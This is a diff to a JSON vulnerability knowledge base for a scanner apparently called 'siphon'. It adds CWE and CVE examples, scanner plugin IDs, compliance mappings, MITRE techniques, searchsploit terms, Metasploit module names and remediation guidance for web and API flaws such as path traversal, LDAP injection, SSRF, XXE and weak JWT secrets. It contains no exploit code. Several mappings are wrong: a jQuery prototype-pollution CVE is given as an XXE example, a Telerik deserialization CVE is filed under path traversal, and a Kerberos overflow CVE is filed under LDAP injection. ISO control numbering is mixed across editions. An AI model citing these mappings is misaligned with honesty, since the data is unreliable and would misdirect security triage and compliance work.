+        "Path Traversal / Local File Inclusion in API",
+        "Local File Inclusion via Path Traversal",
+        "../ Attack",
+        "Path Traversal / Local File Inclusion",
+        "Directory Traversal"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-22",
+        "CWE-23",
+        "CWE-35"
+      ],
+      "cve_examples": [
+        "CVE-2021-41773",
+        "CVE-2021-42013",
+        "CVE-2019-18935",
+        "CVE-2022-22719"
+      ],
       "cvss_v3_base": 8.6,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10297,
+        40984,
+        153953
+      ],
+      "qualys_qids": [
+        150060,
+        150061
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.AA-05",
+        "PR.DS-02"
+      ],
+      "nist_800_53": [
+        "AC-3",
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.1.3"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.9.4.1"
+      ],
+      "iso_27002": [
+        "9.4.1"
+      ],
+      "soc2": [
+        "CC6.3"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
-      "kev": false,
+      "mitre_attack": [
+        {
+          "technique": "T1083",
+          "tactic": "Discovery",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        }
+      ],
+      "searchsploit_terms": [
+        "path traversal",
+        "directory traversal"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/apache_normalize_path"
+      ],
+      "kev": true,
       "remediation_brief": "Validate all file path inputs against a strict allowlist of permitted filenames or paths. Use a canonical path resolution function (realpath(), Path.resolve()) to normalize the path and verify it begins with the expected base directory before any file access. Never concatenate user input directly into filesystem paths. Implement OS-level filesystem isolation (chroot, container volumes) to prevent access outside the intended directory.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Access Control",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://portswigger.net/web-security/file-path-traversal",
         "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
@@ -5414,36 +6565,85 @@
     {
       "id": "SI-096",
       "title": "LDAP Injection in API Parameter",
-      "aliases": [],
+      "aliases": [
+        "LDAP Authentication Bypass",
+        "Directory Service Injection",
+        "LDAP Filter Injection",
+        "LDAP Injection in Login",
+        "LDAP Injection in API Parameter"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-90"
+      ],
+      "cve_examples": [
+        "CVE-2021-25120",
+        "CVE-2022-42898"
+      ],
       "cvss_v3_base": 7.5,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        35291
+      ],
+      "qualys_qids": [
+        150042
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1110",
+          "tactic": "Credential Access",
+          "name": "Brute Force"
+        }
+      ],
+      "searchsploit_terms": [
+        "ldap injection authentication",
+        "ldap injection",
+        "ldap bypass"
+      ],
+      "metasploit_modules": [
+        "auxiliary/gather/ldap_query"
+      ],
       "kev": false,
       "remediation_brief": "Implement LDAP input validation that escapes all LDAP special characters in user-supplied values. Use framework-provided LDAP query parameterization where available. Validate that usernames conform to an expected format (alphanumeric with allowed characters only) before constructing LDAP queries. Apply the principle of least privilege to the LDAP service account: it should have read-only access to only the attributes required by the application.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection",
@@ -5774,12 +6974,17 @@
     {
       "id": "SI-102",
       "title": "WS-Addressing ReplyTo/FaultTo Header Accepted (SSRF Risk)",
-      "aliases": [],
+      "aliases": [
+        "SOAP WS-Addressing SSRF",
+        "WS-Addressing ReplyTo/FaultTo Header Accepted (SSRF Risk)"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
+      "cwe": [
+        "CWE-918"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 8.6,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
@@ -5787,23 +6992,52 @@
       "qualys_qids": [],
       "owasp_web": "A10:2021 Server-Side Request Forgery",
       "owasp_api": "API7:2023 Server Side Request Forgery",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "CA-9",
+        "SC-7"
+      ],
+      "nist_800_171": [
+        "3.13.1",
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "mitre_attack": [
+        {
+          "technique": "T1090",
+          "tactic": "Command and Control",
+          "name": "Proxy"
+        }
+      ],
+      "searchsploit_terms": [
+        "ssrf soap",
+        "ws-addressing"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Validate the wsa:ReplyTo and wsa:FaultTo endpoint addresses against a strict allowlist of permitted destinations before dispatching any outbound message. Block all private IP ranges (RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback (127.0.0.0/8), and link-local (169.254.0.0/16) addresses at the HTTP client layer. Prefer an asynchronous reply model where responses are delivered over the same connection rather than via caller-supplied endpoints. If WS-Addressing reply-to support is not a business requirement, disable the feature entirely in the SOAP stack configuration.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "API",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/ssrf",
         "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
@@ -5833,36 +7067,86 @@
     {
       "id": "SI-103",
       "title": "WS-Security Bypass \u2014 Expired Timestamp / Empty PasswordDigest Accepted",
-      "aliases": [],
+      "aliases": [
+        "WS-Security Bypass",
+        "WS-Security Bypass \u2014 Expired Timestamp / Empty PasswordDigest Accepted",
+        "SOAP WS-Security Weakness"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-287",
+        "CWE-290"
+      ],
+      "cve_examples": [
+        "CVE-2011-2487"
+      ],
       "cvss_v3_base": 9.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
       "nessus_plugin_ids": [],
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.AA-01",
+        "PR.AA-03"
+      ],
+      "nist_800_53": [
+        "IA-5",
+        "SC-8",
+        "AC-17"
+      ],
+      "nist_800_171": [
+        "3.5.10",
+        "3.13.8"
+      ],
+      "pci_dss_4": [
+        "8.3.6",
+        "4.2.1"
+      ],
+      "iso_27001": [
+        "A.9.4.2",
+        "A.10.1.1"
+      ],
+      "iso_27002": [
+        "9.4.2",
+        "10.1.1"
+      ],
+      "soc2": [
+        "CC6.1",
+        "CC6.6"
+      ],
+      "hitrust": [
+        "01.b",
+        "10.f"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1078",
+          "tactic": "Defense Evasion",
+          "name": "Valid Accounts"
+        },
+        {
+          "technique": "T1556",
+          "tactic": "Credential Access",
+          "name": "Modify Authentication Process"
+        }
+      ],
+      "searchsploit_terms": [
+        "ws-security bypass",
+        "soap authentication bypass"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Enforce strict WS-Security timestamp validation with a replay window of no more than 5 minutes and reject all messages whose wsu:Expires has elapsed. Validate the PasswordDigest using the correct formula: Base64(SHA-1(Nonce + Created + Password)); reject any message where the computed digest does not match the submitted value. Reject messages with null, empty, or malformed PasswordDigest values before any business logic is invoked. Maintain a server-side nonce cache to detect and reject replayed nonces within the allowed replay window.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "API",
+      "remediation_category": "Authentication",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://www.oasis-open.org/committees/download.php/16790/wss-v1.1-spec-os-UsernameTokenProfile.pdf",
         "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
@@ -5893,36 +7177,75 @@
     {
       "id": "SI-104",
       "title": "WSDL Enumeration \u2014 Service Definition Exposed",
-      "aliases": [],
+      "aliases": [
+        "WSDL Enumeration \u2014 Service Definition Exposed",
+        "Web Service WSDL Accessible",
+        "SOAP Endpoint Enumerated"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "MEDIUM",
-      "cwe": [],
+      "cwe": [
+        "CWE-284",
+        "CWE-200"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 5.3,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
+      "nessus_plugin_ids": [
+        40984
+      ],
       "qualys_qids": [],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.PS-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "CM-7",
+        "CM-6",
+        "RA-5"
+      ],
+      "nist_800_171": [
+        "3.4.6"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1046",
+          "tactic": "Discovery",
+          "name": "Network Service Discovery"
+        }
+      ],
+      "searchsploit_terms": [
+        "wsdl enumeration",
+        "soap service discovery"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/wsdl_scanner"
+      ],
       "kev": false,
       "remediation_brief": "Restrict access to the WSDL document by requiring authentication before serving the ?wsdl or ?WSDL query parameter response. If the WSDL must be publicly accessible for integration purposes, ensure it does not reference internal-only operations or schema types. Consider maintaining a separate external-facing WSDL that exposes only public operations. At minimum, monitor access to the WSDL endpoint and alert on high-frequency enumeration.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "API",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/02-Fingerprint_Web_Server",
         "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/",
@@ -5950,36 +7273,73 @@
     {
       "id": "SI-105",
       "title": "Unsafe API Consumption \u2014 Webhook URL Accepted (SSRF Risk)",
-      "aliases": [],
+      "aliases": [
+        "Unsafe API Consumption \u2014 Webhook URL Accepted (SSRF Risk)",
+        "Server-Side Request Forgery via Webhook",
+        "Webhook SSRF Risk"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-918"
+      ],
+      "cve_examples": [
+        "CVE-2021-26855"
+      ],
       "cvss_v3_base": 7.5,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
       "nessus_plugin_ids": [],
       "qualys_qids": [],
       "owasp_web": "A10:2021 Server-Side Request Forgery",
       "owasp_api": "API7:2023 Server Side Request Forgery",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SC-7",
+        "CA-9"
+      ],
+      "nist_800_171": [
+        "3.13.1",
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "mitre_attack": [
+        {
+          "technique": "T1090.002",
+          "tactic": "Command and Control",
+          "name": "Proxy: External Proxy"
+        }
+      ],
+      "searchsploit_terms": [
+        "ssrf webhook",
+        "server side request forgery"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Validate all webhook and callback URLs against a strict allowlist of permitted schemes (HTTPS only), domain suffixes, and IP ranges before any outbound connection is made. Block requests to private IP ranges (RFC 1918), loopback addresses, link-local ranges, and cloud metadata IP addresses at the HTTP client layer. Perform DNS resolution server-side and verify the resolved IP is not in a blocked range (DNS rebinding defence). If external webhook delivery is a feature requirement, perform an initial probe of the URL before registering it and enforce a retry-limit with exponential backoff.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "API",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/ssrf",
         "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
@@ -6068,36 +7428,71 @@
     {
       "id": "SI-107",
       "title": "Unsafe API Consumption \u2014 Serialization Markers in Response",
-      "aliases": [],
+      "aliases": [
+        "Unsafe Consumption \u2014 Serialization Markers in API Response",
+        "Unsafe API Consumption \u2014 Serialization Markers in Response"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-502"
+      ],
+      "cve_examples": [
+        "CVE-2015-4852",
+        "CVE-2017-5941"
+      ],
       "cvss_v3_base": 7.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
       "nessus_plugin_ids": [],
       "qualys_qids": [],
       "owasp_web": "A08:2021 Software and Data Integrity Failures",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SA-11"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "mitre_attack": [
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "java deserialization",
+        "unsafe deserialization"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Replace language-native serialization with a data-format-neutral representation (JSON, Protobuf, MessagePack) for all data transmitted across API boundaries. If serialization is required, implement a strict type allowlist in the deserializer so only expected types can be instantiated. Sign all serialized payloads with a server-side HMAC and verify the signature before deserialization to detect tampering. Audit all API response bodies for serialization format markers and eliminate unnecessary exposure of internal object representations.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "API",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/deserialization",
         "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html",
@@ -6127,12 +7522,20 @@
     {
       "id": "SI-108",
       "title": "Weak JWT Secret",
-      "aliases": [],
+      "aliases": [
+        "JWT Secret Brute-Forceable",
+        "JWT Secret Cracked",
+        "Weak JWT Secret",
+        "Weak HS256 JWT Key"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
+      "cwe": [
+        "CWE-347",
+        "CWE-521"
+      ],
       "cve_examples": [
         "CVE-2018-1000531"
       ],
@@ -6142,23 +7545,52 @@
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.AA-01",
+        "PR.DS-01"
+      ],
+      "nist_800_53": [
+        "IA-5",
+        "SC-28"
+      ],
+      "nist_800_171": [
+        "3.5.10"
+      ],
+      "pci_dss_4": [
+        "8.3.6"
+      ],
+      "iso_27001": [
+        "A.10.1.1"
+      ],
+      "iso_27002": [
+        "10.1.1"
+      ],
+      "soc2": [
+        "CC6.1"
+      ],
+      "hitrust": [
+        "01.b"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1550.001",
+          "tactic": "Defense Evasion",
+          "name": "Use Alternate Authentication Material: Application Access Token"
+        }
+      ],
+      "searchsploit_terms": [
+        "jwt crack",
+        "hashcat jwt"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Immediately rotate the JWT signing secret. Generate the new secret using a cryptographically secure random number generator (os.urandom, /dev/urandom, or an HSM) with a minimum of 256 bits of entropy. Do not use human-readable strings, environment variable defaults, or framework placeholder values as signing secrets. Store the secret in a secrets management system (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager) rather than in configuration files or environment variables committed to source control. Consider migrating to asymmetric signing (RS256, ES256) to eliminate the shared-secret risk model entirely.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Authentication",
+      "remediation_category": "Encryption",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key",
         "https://nvd.nist.gov/vuln/detail/CVE-2018-1000531",
@@ -6193,36 +7625,70 @@
     {
       "id": "SI-109",
       "title": "Sensitive File Exposed",
-      "aliases": [],
+      "aliases": [
+        "Archive File Exposed",
+        "Sensitive File Exposed",
+        "Backup File Accessible on Web",
+        ".bak File Exposed",
+        "Database Dump Accessible"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
+      "cwe": [
+        "CWE-530"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 7.5,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
-      "nessus_plugin_ids": [],
+      "nessus_plugin_ids": [
+        10518
+      ],
       "qualys_qids": [],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
+      "nist_csf2": [
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "CM-6",
+        "CM-7"
+      ],
       "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
+      "pci_dss_4": [
+        "3.4.1"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
       "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1552.001",
+          "tactic": "Credential Access",
+          "name": "Unsecured Credentials: Credentials In Files"
+        }
+      ],
+      "searchsploit_terms": [
+        "backup file",
+        ".bak exposure"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Remove all sensitive files from any directory served by the web or API server. Configure the server to return 403 or 404 for known sensitive file extensions and paths (.env, .git, .bak, .key, .pem). Implement a server-level allowlist of permitted static file types rather than a denylist. Audit the API server's document root and all static directories for sensitive file exposure using automated tools. Ensure deployment pipelines do not copy development configuration files, credentials, or version control metadata to production server directories.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Server",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information",
         "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/",
@@ -6252,38 +7718,92 @@
     {
       "id": "SI-110",
       "title": "XML External Entity (XXE) Injection in API",
-      "aliases": [],
+      "aliases": [
+        "XXE",
+        "XXE in API",
+        "XML Injection",
+        "XML External Entity (XXE) Injection",
+        "Blind XXE",
+        "Out-of-Band XXE",
+        "XXE File Read",
+        "XML External Entity (XXE) Injection in API"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
+      "cwe": [
+        "CWE-611",
+        "CWE-827"
+      ],
       "cve_examples": [
         "CVE-2019-11358"
       ],
       "cvss_v3_base": 9.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        108799,
+        33929
+      ],
+      "qualys_qids": [
+        150040,
+        150041
+      ],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "CM-6"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1083",
+          "tactic": "Discovery",
+          "name": "File and Directory Discovery"
+        }
+      ],
+      "searchsploit_terms": [
+        "xxe",
+        "xml external entity"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/xml_injection"
+      ],
       "kev": false,
       "remediation_brief": "Disable external entity processing and DTD processing entirely in the XML parser configuration. In Java, set XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES and XMLInputFactory.SUPPORT_DTD to false. In Python, use defusedxml instead of the standard library xml module. In PHP, call libxml_disable_entity_loader(true) before parsing. If XML with DTD is a business requirement, use a parser that supports a safe whitelist of entity definitions and blocks all external references. Migrate XML-based APIs to JSON where possible to eliminate the XXE attack surface.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/xxe",
         "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
@@ -6317,36 +7837,61 @@
     {
       "id": "SI-111",
       "title": "TRACE Method Enabled (Cross-Site Tracing / XST)",
-      "aliases": [],
+      "aliases": [
+        "TRACE Method XST Attack",
+        "Cross-Site Tracing (XST)",
+        "HTTP TRACE Enabled",
+        "TRACE Method Enabled (Cross-Site Tracing / XST)"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "LOW",
-      "cwe": [],
+      "cwe": [
+        "CWE-16"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 3.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        11213
+      ],
+      "qualys_qids": [
+        86189
+      ],
       "owasp_web": "A05:2021 Security Misconfiguration",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
+      "nist_csf2": [
+        "PR.PS-01"
+      ],
+      "nist_800_53": [
+        "CM-6",
+        "CM-7"
+      ],
       "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.12.6.1"
+      ],
+      "iso_27002": [
+        "12.6.1"
+      ],
       "soc2": [],
       "hitrust": [],
       "gdpr": [],
       "mitre_attack": [],
-      "searchsploit_terms": [],
+      "searchsploit_terms": [
+        "http trace",
+        "xst"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Disable the HTTP TRACE method in the web server configuration. In Apache, add TraceEnable off to the server configuration. In Nginx, block TRACE with a location block returning 405. In IIS, use the requestFiltering module to block the TRACE verb. At the API gateway or WAF level, configure an HTTP method allowlist restricted to the methods the API explicitly uses (typically GET, POST, PUT, PATCH, DELETE, OPTIONS). Verify the fix with a direct TRACE request confirming a 405 Method Not Allowed response.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Server",
+      "remediation_category": "Configuration",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
         "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
@@ -6378,36 +7923,61 @@
     {
       "id": "SI-112",
       "title": "HTTP Method Override Accepted",
-      "aliases": [],
+      "aliases": [
+        "HTTP Method Override Abuse",
+        "HTTP Verb Tampering",
+        "PUT/DELETE Method Enabled",
+        "HTTP Method Override Accepted"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "MEDIUM",
-      "cwe": [],
+      "cwe": [
+        "CWE-650"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 5.4,
